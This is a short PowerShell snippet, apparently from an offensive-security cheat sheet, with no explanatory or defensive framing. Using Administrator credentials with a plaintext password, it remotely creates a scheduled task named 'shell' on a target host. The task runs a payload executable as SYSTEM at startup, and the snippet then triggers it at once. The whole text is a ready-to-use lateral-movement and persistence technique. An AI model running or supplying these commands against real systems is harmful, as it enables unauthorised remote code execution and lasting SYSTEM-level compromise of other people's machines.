# In a powershell termial 

# Create Password veriable 
$pw = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force

#Declare the user
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)

#Set Task
Invoke-Command -Computer <HOSTNAME> -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\Path\To\Payload.exe /ru SYSTEM } -Credential $creds

#Invoke Task 
Invoke-Command -Computer <HOSTNAME> -ScriptBlock { schtasks /run /tn shell } -Credential $creds
